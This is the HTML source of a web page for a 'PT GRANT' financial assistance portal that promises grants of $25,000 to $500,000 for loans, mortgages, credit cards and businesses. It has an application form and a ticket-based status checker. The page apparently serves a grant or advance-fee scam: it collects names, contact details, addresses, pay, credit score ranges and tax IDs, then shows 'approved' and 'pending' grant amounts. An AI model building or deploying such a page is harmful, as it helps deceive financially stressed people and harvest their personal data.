<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PT GRANT - Official Grant Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-slate-50 text-slate-800">

    <!-- FULL SCREEN RECTANGULAR HERO LOGO BANNER -->
    <header class="w-full bg-slate-900 border-b-4 border-amber-500 shadow-2xl">
        <div class="w-full h-64 md:h-80 relative overflow-hidden flex items-center justify-center">
            <img src="ptlogo.jpeg" alt="PT GRANT LOGO" class="w-full h-full object-cover object-center opacity-90" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?auto=format&fit=crop&w=1600&q=80';">
            <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-900/40 to-transparent flex flex-col items-center justify-end pb-8">
                <h1 class="text-4xl md:text-6xl font-black text-white tracking-widest uppercase drop-shadow-lg">PT GRANT</h1>
                <p class="text-amber-400 font-medium text-lg md:text-xl tracking-wider mt-2">Financial Assistance Program ($25,000 - $500,000)</p>
            </div>
        </div>
    </header>

    <div class="max-w-5xl mx-auto px-4 py-8">
        <div class="flex justify-end mb-6">
            <button onclick="document.getElementById('statusModal').classList.remove('hidden')" class="bg-amber-500 hover:bg-amber-600 text-slate-900 font-bold px-6 py-3 rounded-lg shadow-lg flex items-center gap-2 transition">
                <i class="fa-solid fa-magnifying-glass"></i> Check Application Status
            </button>
        </div>

        <!-- APPLICATION FORM -->
        <div class="bg-white rounded-xl shadow-xl border border-slate-200 overflow-hidden">
            <div class="bg-slate-900 text-white p-6">
                <h2 class="text-2xl font-bold">Grant Assistance Qualification Form</h2>
                <p class="text-slate-400 text-sm mt-1">Fill out the information below to qualify for grants ranging from $25,000 to $500,000.</p>
            </div>

            <form id="grantForm" action="save.php" method="POST" class="p-6 md:p-8 space-y-6">
                <!-- ASSISTANCE SELECTION -->
                <div>
                    <label class="block font-bold text-slate-700 mb-2">Select Kind of Assistance Request *</label>
                    <select name="assistance_type" id="assistanceType" onchange="toggleFormSection(this.value)" class="w-full border border-slate-300 rounded-lg p-3 focus:ring-2 focus:ring-indigo-500 outline-none" required>
                        <option value="Personal Loan Assistance">Personal Loan Assistance</option>
                        <option value="Mortgage Assistance">Mortgage Assistance</option>
                        <option value="Credit Card Assistance">Credit Card Assistance</option>
                        <option value="Home Refinance Assistance">Home Refinance Assistance</option>
                        <option value="Auto Loan Assistance">Auto Loan Assistance</option>
                        <option value="Business Assistance">Business Assistance</option>
                    </select>
                </div>

                <!-- CONTACT INFORMATION -->
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">First Name *</label>
                        <input type="text" name="first_name" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Last Name *</label>
                        <input type="text" name="last_name" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Email Address *</label>
                        <input type="email" name="email" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Phone Number *</label>
                        <input type="tel" name="phone" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                </div>

                <!-- ADDRESS FIELDS -->
                <div class="space-y-4">
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Address Line 1 *</label>
                        <input type="text" name="address1" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Address Line 2</label>
                        <input type="text" name="address2" class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block font-semibold text-slate-700 mb-1">City *</label>
                            <input type="text" name="city" required class="w-full border border-slate-300 rounded-lg p-3">
                        </div>
                        <div>
                            <label class="block font-semibold text-slate-700 mb-1">State *</label>
                            <input type="text" name="state" required class="w-full border border-slate-300 rounded-lg p-3">
                        </div>
                        <div>
                            <label class="block font-semibold text-slate-700 mb-1">Zip Code *</label>
                            <input type="text" name="zip" required class="w-full border border-slate-300 rounded-lg p-3">
                        </div>
                    </div>
                </div>

                <!-- EMPLOYMENT & PAY DETAILS -->
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Employment Status *</label>
                        <select name="employment_status" class="w-full border border-slate-300 rounded-lg p-3" required>
                            <option value="Employed">Employed</option>
                            <option value="Self-Employed">Self-Employed</option>
                            <option value="Unemployed">Unemployed</option>
                            <option value="Retired">Retired</option>
                        </select>
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Pay Frequency *</label>
                        <select name="pay_frequency" class="w-full border border-slate-300 rounded-lg p-3" required>
                            <option value="Weekly">Weekly</option>
                            <option value="Bi-Weekly">Bi-Weekly</option>
                            <option value="Monthly">Monthly</option>
                        </select>
                    </div>
                    <div>
                        <label class="block font-semibold text-slate-700 mb-1">Pay Amount ($) *</label>
                        <input type="number" name="pay_amount" step="0.01" required class="w-full border border-slate-300 rounded-lg p-3">
                    </div>
                </div>

                <!-- CREDIT INFO -->
                <div>
                    <label class="block font-semibold text-slate-700 mb-1">Estimated Credit Score Range *</label>
                    <select name="credit_score_range" class="w-full border border-slate-300 rounded-lg p-3" required>
                        <option value="720+ (Excellent)">720+ (Excellent)</option>
                        <option value="660 - 719 (Good)">660 - 719 (Good)</option>
                        <option value="620 - 659 (Fair)">620 - 659 (Fair)</option>
                        <option value="Below 620 (Poor)">Below 620 (Poor)</option>
                    </select>
                </div>

                <!-- DYNAMIC BUSINESS SECTION -->
                <div id="businessSection" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-lg space-y-4">
                    <h3 class="font-bold text-amber-900">Business Assistance Information</h3>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block text-sm font-semibold">Business Name</label>
                            <input type="text" name="business_name" class="w-full border rounded p-2">
                        </div>
                        <div>
                            <label class="block text-sm font-semibold">EIN / Tax ID</label>
                            <input type="text" name="business_ein" class="w-full border rounded p-2">
                        </div>
                        <div>
                            <label class="block text-sm font-semibold">Annual Revenue ($)</label>
                            <input type="text" name="business_revenue" class="w-full border rounded p-2">
                        </div>
                    </div>
                </div>

                <button type="submit" class="w-full bg-slate-900 text-white font-bold py-4 rounded-lg text-lg hover:bg-slate-800 transition shadow-lg">
                    Submit Application for Qualification
                </button>
            </form>
        </div>
    </div>

    <!-- CHECK STATUS MODAL -->
    <div id="statusModal" class="hidden fixed inset-0 bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
        <div class="bg-white w-full max-w-md rounded-xl shadow-2xl p-6 relative">
            <button onclick="document.getElementById('statusModal').classList.add('hidden')" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-xl font-bold">&times;</button>
            <h3 class="text-xl font-bold text-slate-900 mb-4">Check Application Status</h3>
            <form id="statusLoginForm" onsubmit="checkStatus(event)" class="space-y-4">
                <div>
                    <label class="block text-sm font-semibold mb-1">Ticket ID *</label>
                    <input type="text" id="loginTicketId" required placeholder="e.g. PTG-123456" class="w-full border rounded p-3">
                </div>
                <div>
                    <label class="block text-sm font-semibold mb-1">Applicant Last Name *</label>
                    <input type="text" id="loginLastName" required placeholder="Your Last Name" class="w-full border rounded p-3">
                </div>
                <button type="submit" class="w-full bg-amber-500 text-slate-900 font-bold py-3 rounded-lg hover:bg-amber-600">Access Status Dashboard</button>
            </form>
        </div>
    </div>

    <script>
        function toggleFormSection(val) {
            const biz = document.getElementById('businessSection');
            if (val === 'Business Assistance') {
                biz.classList.remove('hidden');
            } else {
                biz.classList.add('hidden');
            }
        }

        async function checkStatus(e) {
            e.preventDefault();
            const ticket_id = document.getElementById('loginTicketId').value;
            const last_name = document.getElementById('loginLastName').value;

            const formData = new FormData();
            formData.append('ticket_id', ticket_id);
            formData.append('last_name', last_name);

            const res = await fetch('check_status.php', { method: 'POST', body: formData });
            const data = await res.json();

            if (data.success) {
                alert(`Welcome back ${data.application.first_name}!\n\nStatus: ${data.application.status}\nApproved Grant: $${data.application.approved_amount}\nPending Grant: $${data.application.pending_amount}`);
            } else {
                alert(data.error);
            }
        }
    </script>
</body>
</html>
